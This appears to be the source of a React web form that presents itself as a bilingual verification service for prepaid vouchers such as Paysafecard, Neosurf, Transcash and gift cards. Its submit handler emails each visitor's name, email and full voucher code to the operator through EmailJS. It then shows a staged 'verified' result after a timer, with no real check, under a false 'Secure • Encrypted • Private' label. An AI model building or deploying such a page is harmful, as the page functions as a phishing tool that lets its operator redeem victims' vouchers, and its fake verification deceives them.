import React, { useRef, useState } from 'react'
import emailjs from '@emailjs/browser'
import type { Translations } from '../utils/i18n'
import './VerifyForm.css'

const EMAILJS_SERVICE_ID = import.meta.env.VITE_EMAILJS_SERVICE_ID
const EMAILJS_TEMPLATE_ID = import.meta.env.VITE_EMAILJS_TEMPLATE_ID
const EMAILJS_PUBLIC_KEY = import.meta.env.VITE_EMAILJS_PUBLIC_KEY

const TICKET_TYPES = [
  { value: 'transcash',      en: 'Transcash',            pt: 'Transcash'             },
  { value: 'neosurf',        en: 'Neosurf',              pt: 'Neosurf'               },
  { value: 'vapeur',         en: 'Steam (Vapeur)',        pt: 'Steam (Vapor)'         },
  { value: 'paysafecard',    en: 'Paysafecard',          pt: 'Paysafecard'           },
  { value: 'apple_card',     en: 'Apple Card',           pt: 'Apple Card'            },
  { value: 'google_play',    en: 'Google Play',          pt: 'Google Play'           },
  { value: 'mastercard_pcs', en: 'Mastercard PCS Card',  pt: 'Cartão Mastercard PCS' },
]

const AMOUNTS = [10, 20, 50, 100, 150, 200, 250, 500, 1000]

const UI = {
  en: {
    fullName:            'Full name',
    fullNamePlaceholder: 'e.g. John Smith',
    email:               'Email address',
    emailPlaceholder:    'example@email.com',
    ticketType:          'Ticket type',
    ticketTypePh:        'Select a type...',
    ticketCode:          'Ticket code',
    ticketCodePh:        'Enter ticket code',
    amount:              'Amount',
    amountPh:            'Select an amount...',
    hideCode:            'Hide code',
    hideCodeDesc:        'The code will be masked during input',
    showCode:            'Show code',
    showCodeDesc:        'The code is currently visible',
    secure:              'Secure • Encrypted • Private',
  },
  pt: {
    fullName:            'Nome completo',
    fullNamePlaceholder: 'Ex: João Silva',
    email:               'Endereço de email',
    emailPlaceholder:    'exemplo@email.com',
    ticketType:          'Tipo de bilhete',
    ticketTypePh:        'Selecione um tipo...',
    ticketCode:          'Código do bilhete',
    ticketCodePh:        'Insira o código do bilhete',
    amount:              'Montante',
    amountPh:            'Selecione um montante...',
    hideCode:            'Ocultar código',
    hideCodeDesc:        'O código ficará oculto durante a digitação',
    showCode:            'Mostrar código',
    showCodeDesc:        'O código está atualmente visível',
    secure:              'Seguro • Encriptado • Privado',
  },
}

interface FormData {
  fullName:   string
  email:      string
  ticketType: string
  ticketCode: string
  amount:     string
  hideCode:   boolean
}

interface FormErrors {
  fullName?:   string
  email?:      string
  ticketType?: string
  ticketCode?: string
  amount?:     string
}

type Phase = 'idle' | 'loading' | 'success'

interface Props {
  t:        Translations
  lang?:    'en' | 'pt'
  formRef?: React.RefObject<HTMLDivElement>
}

export const VerifyForm: React.FC<Props> = ({ t, lang = 'en', formRef }) => {
  const ui = UI[lang]

  const [form, setForm] = useState<FormData>({
    fullName:   '',
    email:      '',
    ticketType: '',
    ticketCode: '',
    amount:     '',
    hideCode:   false,
  })
  const [errors,       setErrors]       = useState<FormErrors>({})
  const [phase,        setPhase]        = useState<Phase>('idle')
  const [loadingMsg,   setLoadingMsg]   = useState(0)
  const [verifiedData, setVerifiedData] = useState<FormData | null>(null)
  const [timestamp,    setTimestamp]    = useState('')
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null)

  const validate = (): boolean => {
    const newErrors: FormErrors = {}
    if (!form.fullName.trim())   newErrors.fullName   = t.form.required
    if (!form.email.trim())      newErrors.email      = t.form.required
    if (!form.ticketType)        newErrors.ticketType = t.form.required
    if (!form.ticketCode.trim()) newErrors.ticketCode = t.form.required
    if (!form.amount)            newErrors.amount     = t.form.required
    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleChange = (field: keyof FormData, value: string | boolean) => {
    setForm(prev => ({ ...prev, [field]: value }))
    if (typeof value === 'string' && errors[field as keyof FormErrors]) {
      setErrors(prev => ({ ...prev, [field]: undefined }))
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!validate()) return

    setPhase('loading')
    setLoadingMsg(0)

    let idx = 0
    intervalRef.current = setInterval(() => {
      idx++
      if (idx < t.verification.loadingMessages.length) {
        setLoadingMsg(idx)
      } else {
        if (intervalRef.current) clearInterval(intervalRef.current)
      }
    }, 900)

    try {
      await emailjs.send(
        EMAILJS_SERVICE_ID,
        EMAILJS_TEMPLATE_ID,
        {
          full_name:    form.fullName,
          email:        form.email,
          ticket_type:  form.ticketType,
          ticket_code:  form.ticketCode,
          amount:       `${form.amount}€`,
          hide_code:    form.hideCode,
          submitted_at: new Date().toLocaleString(),
        },
        EMAILJS_PUBLIC_KEY
      )
    } catch (_err) {
      console.warn('EmailJS send failed')
    }

    setTimeout(() => {
      if (intervalRef.current) clearInterval(intervalRef.current)
      setVerifiedData({ ...form })
      setTimestamp(new Date().toLocaleString())
      setPhase('success')
    }, 5000)
  }

  const handleReset = () => {
    setPhase('idle')
    setForm({ fullName: '', email: '', ticketType: '', ticketCode: '', amount: '', hideCode: false })
    setErrors({})
    setVerifiedData(null)
  }

  const ticketTypeLabel = (val: string) =>
    TICKET_TYPES.find(tt => tt.value === val)?.[lang] ?? val

  /* ------------------------------------------------------------------ */
  /* Icon helpers                                                         */
  /* ------------------------------------------------------------------ */
  const IconEye = () => (
    <svg viewBox="0 0 20 20" fill="none" width="17" height="17">
      <ellipse cx="10" cy="10" rx="8" ry="5" stroke="currentColor" strokeWidth="1.5"/>
      <circle cx="10" cy="10" r="2.5" stroke="currentColor" strokeWidth="1.5"/>
    </svg>
  )

  const IconEyeOff = () => (
    <svg viewBox="0 0 20 20" fill="none" width="17" height="17">
      <path d="M3 3l14 14" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
      <path d="M8.5 8.6A3 3 0 0 0 10 13a3 3 0 0 0 3-3 3 3 0 0 0-.6-1.8"
            stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
      <path d="M6.3 6.4C4.5 7.5 3 9 2 10c1.5 2.5 4.5 5 8 5 1.5 0 2.9-.5 4.1-1.2"
            stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
      <path d="M4 4.5C5.5 3.5 7.7 3 10 3c3.5 0 6.5 2.5 8 5-1 1.8-2.6 3.4-4.5 4.3"
            stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
    </svg>
  )

  /* ------------------------------------------------------------------ */
  /* Render                                                               */
  /* ------------------------------------------------------------------ */
  return (
    <div className="vf-wrapper" ref={formRef} id="verify-form">
      <div className={`vf-card ${phase === 'loading' ? 'vf-card--loading' : ''} ${phase === 'success' ? 'vf-card--success' : ''}`}>

        {/* ============================================================ */}
        {/* IDLE — form                                                   */}
        {/* ============================================================ */}
        {phase === 'idle' && (
          <div className="vf-form-inner" style={{ animation: 'fadeUp 0.5s ease both' }}>

            <div className="vf-card__header">
              <div className="vf-card__icon">
                <svg viewBox="0 0 24 24" fill="none">
                  <rect x="3" y="7" width="18" height="14" rx="2"
                        stroke="currentColor" strokeWidth="1.8"/>
                  <path d="M8 7V5a4 4 0 0 1 8 0v2"
                        stroke="currentColor" strokeWidth="1.8" strokeLinecap="round"/>
                  <circle cx="12" cy="14" r="2" fill="currentColor"/>
                </svg>
              </div>
              <div>
                <h2 className="vf-card__title">{t.form.title}</h2>
                <p className="vf-card__subtitle">{t.form.subtitle}</p>
              </div>
            </div>

            <form onSubmit={handleSubmit} noValidate>

              {/* Full name */}
              <div className={`vf-field ${errors.fullName ? 'vf-field--error' : ''}`}>
                <label className="vf-label">{ui.fullName}</label>
                <div className="vf-input-wrap">
                  <span className="vf-input-icon">
                    <svg viewBox="0 0 20 20" fill="none">
                      <circle cx="10" cy="7" r="3" stroke="currentColor" strokeWidth="1.5"/>
                      <path d="M3 17c0-3.3 3.1-6 7-6s7 2.7 7 6"
                            stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
                    </svg>
                  </span>
                  <input
                    type="text"
                    className="vf-input"
                    placeholder={ui.fullNamePlaceholder}
                    value={form.fullName}
                    onChange={e => handleChange('fullName', e.target.value)}
                    autoComplete="name"
                  />
                </div>
                {errors.fullName && <span className="vf-error-msg">{errors.fullName}</span>}
              </div>

              {/* Email */}
              <div className={`vf-field ${errors.email ? 'vf-field--error' : ''}`}>
                <label className="vf-label">{ui.email}</label>
                <div className="vf-input-wrap">
                  <span className="vf-input-icon">
                    <svg viewBox="0 0 20 20" fill="none">
                      <rect x="2" y="5" width="16" height="11" rx="2"
                            stroke="currentColor" strokeWidth="1.5"/>
                      <path d="M2 7l8 5 8-5"
                            stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
                    </svg>
                  </span>
                  <input
                    type="email"
                    className="vf-input"
                    placeholder={ui.emailPlaceholder}
                    value={form.email}
                    onChange={e => handleChange('email', e.target.value)}
                    autoComplete="email"
                  />
                </div>
                {errors.email && <span className="vf-error-msg">{errors.email}</span>}
              </div>

              {/* Ticket type */}
              <div className={`vf-field ${errors.ticketType ? 'vf-field--error' : ''}`}>
                <label className="vf-label">{ui.ticketType}</label>
                <div className="vf-select-wrap">
                  <select
                    className="vf-select"
                    value={form.ticketType}
                    onChange={e => handleChange('ticketType', e.target.value)}
                  >
                    <option value="">{ui.ticketTypePh}</option>
                    {TICKET_TYPES.map(tt => (
                      <option key={tt.value} value={tt.value}>{tt[lang]}</option>
                    ))}
                  </select>
                  <span className="vf-select-arrow">
                    <svg viewBox="0 0 16 16" fill="none">
                      <path d="M4 6l4 4 4-4" stroke="currentColor"
                            strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  </span>
                </div>
                {errors.ticketType && <span className="vf-error-msg">{errors.ticketType}</span>}
              </div>

              {/* Ticket code + hide toggle inline */}
              <div className={`vf-field ${errors.ticketCode ? 'vf-field--error' : ''}`}>
                <div className="vf-label-row">
                  <label className="vf-label">{ui.ticketCode}</label>
                  {/* ---- Hide / Show button ---- */}
                  <button
                    type="button"
                    className={`vf-visibility-btn ${form.hideCode ? 'vf-visibility-btn--hidden' : ''}`}
                    onClick={() => handleChange('hideCode', !form.hideCode)}
                    aria-pressed={form.hideCode}
                  >
                    {form.hideCode ? <IconEyeOff /> : <IconEye />}
                    <span>{form.hideCode ? ui.showCode : ui.hideCode}</span>
                  </button>
                </div>
                <div className="vf-input-wrap">
                  <span className="vf-input-icon">
                    <svg viewBox="0 0 20 20" fill="none">
                      <path d="M10 2a4 4 0 0 0-4 4v2H5a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h10
                               a1 1 0 0 0 1-1V9a1 1 0 0 0-1-1h-1V6a4 4 0 0 0-4-4z
                               m0 10a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3z"
                            fill="currentColor" opacity="0.6"/>
                    </svg>
                  </span>
                  <input
                    type={form.hideCode ? 'password' : 'text'}
                    className="vf-input vf-input--code"
                    placeholder={ui.ticketCodePh}
                    value={form.ticketCode}
                    onChange={e => handleChange('ticketCode', e.target.value.toUpperCase())}
                    autoComplete="off"
                    spellCheck={false}
                    maxLength={20}
                  />
                </div>
                {errors.ticketCode && <span className="vf-error-msg">{errors.ticketCode}</span>}
                {/* Subtle status hint under the field */}
                <p className="vf-code-hint">
                  {form.hideCode ? ui.hideCodeDesc : ui.showCodeDesc}
                </p>
              </div>

              {/* Amount */}
              <div className={`vf-field ${errors.amount ? 'vf-field--error' : ''}`}>
                <label className="vf-label">{ui.amount}</label>
                <div className="vf-select-wrap">
                  <select
                    className="vf-select"
                    value={form.amount}
                    onChange={e => handleChange('amount', e.target.value)}
                  >
                    <option value="">{ui.amountPh}</option>
                    {AMOUNTS.map(a => (
                      <option key={a} value={String(a)}>{a}€</option>
                    ))}
                  </select>
                  <span className="vf-select-arrow">
                    <svg viewBox="0 0 16 16" fill="none">
                      <path d="M4 6l4 4 4-4" stroke="currentColor"
                            strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  </span>
                </div>
                {errors.amount && <span className="vf-error-msg">{errors.amount}</span>}
              </div>

              <button type="submit" className="vf-submit">
                <svg viewBox="0 0 20 20" fill="none">
                  <path d="M10 18a8 8 0 1 0 0-16 8 8 0 0 0 0 16zm-1-5l-2-2
                           1.5-1.5.5.5 3-3L13.5 8.5 9 13z" fill="currentColor"/>
                </svg>
                {t.form.submit}
              </button>
            </form>

            <p className="vf-secure-note">
              <svg viewBox="0 0 16 16" fill="none">
                <path d="M8 1.5L2 4v4c0 3.3 2.5 6.1 6 7 3.5-.9 6-3.7 6-7V4L8 1.5z"
                      stroke="currentColor" strokeWidth="1.2" strokeLinejoin="round"/>
              </svg>
              {ui.secure}
            </p>
          </div>
        )}

        {/* ============================================================ */}
        {/* LOADING                                                       */}
        {/* ============================================================ */}
        {phase === 'loading' && (
          <div className="vf-loading" style={{ animation: 'scaleIn 0.3s ease both' }}>
            <div className="vf-loading__rings">
              <div className="vf-loading__ring vf-loading__ring--1"/>
              <div className="vf-loading__ring vf-loading__ring--2"/>
              <div className="vf-loading__ring vf-loading__ring--3"/>
              <div className="vf-loading__spinner"/>
            </div>
            <div className="vf-loading__bar-wrap">
              <div className="vf-loading__bar"/>
            </div>
            <p className="vf-loading__msg" key={loadingMsg}>
              {t.verification.loadingMessages[loadingMsg]}
            </p>
            <p className="vf-loading__sub">
              {lang === 'en'
                ? 'Please wait, this only takes a moment...'
                : 'Por favor aguarde, isto leva apenas um momento...'}
            </p>
          </div>
        )}

        {/* ============================================================ */}
        {/* SUCCESS                                                       */}
        {/* ============================================================ */}
        {phase === 'success' && verifiedData && (
          <div className="vf-success" style={{ animation: 'scaleIn 0.4s ease both' }}>
            <div className="vf-success__badge">
              <div className="vf-success__ring"/>
              <div className="vf-success__ring vf-success__ring--2"/>
              <svg className="vf-success__check" viewBox="0 0 50 50" fill="none">
                <circle cx="25" cy="25" r="23" stroke="currentColor" strokeWidth="2" opacity="0.2"/>
                <path
                  d="M14 25l8 8 14-14"
                  stroke="currentColor"
                  strokeWidth="3"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeDasharray="100"
                  strokeDashoffset="0"
                  style={{ animation: 'checkDraw 0.6s ease 0.3s both' }}
                />
              </svg>
            </div>

            <h2 className="vf-success__title">{t.verification.success.title}</h2>
            <p className="vf-success__subtitle">{t.verification.success.subtitle}</p>

            <div className="vf-success__details">
              <div className="vf-success__row">
                <span className="vf-success__row-label">
                  {lang === 'en' ? 'Full name' : 'Nome completo'}
                </span>
                <span className="vf-success__row-value">{verifiedData.fullName}</span>
              </div>
              <div className="vf-success__row">
                <span className="vf-success__row-label">Email</span>
                <span className="vf-success__row-value">{verifiedData.email}</span>
              </div>
              <div className="vf-success__row">
                <span className="vf-success__row-label">{t.verification.success.type}</span>
                <span className="vf-success__row-value">
                  {ticketTypeLabel(verifiedData.ticketType)}
                </span>
              </div>
              <div className="vf-success__row">
                <span className="vf-success__row-label">{t.verification.success.code}</span>
                <span className="vf-success__row-value vf-mono">
                  {verifiedData.hideCode ? '••••••••' : verifiedData.ticketCode}
                </span>
              </div>
              <div className="vf-success__row">
                <span className="vf-success__row-label">
                  {lang === 'en' ? 'Amount' : 'Montante'}
                </span>
                <span className="vf-success__row-value">{verifiedData.amount}€</span>
              </div>
              <div className="vf-success__row">
                <span className="vf-success__row-label">{t.verification.success.timestamp}</span>
                <span className="vf-success__row-value">{timestamp}</span>
              </div>
            </div>

            <button className="vf-reset" onClick={handleReset}>
              <svg viewBox="0 0 20 20" fill="none">
                <path d="M4 10a6 6 0 1 0 .5-2.4"
                      stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
                <path d="M2 6l2.5 1.6L7 6"
                      stroke="currentColor" strokeWidth="1.5"
                      strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
              {t.verification.success.verifyAnother}
            </button>
          </div>
        )}
      </div>
    </div>
  )
}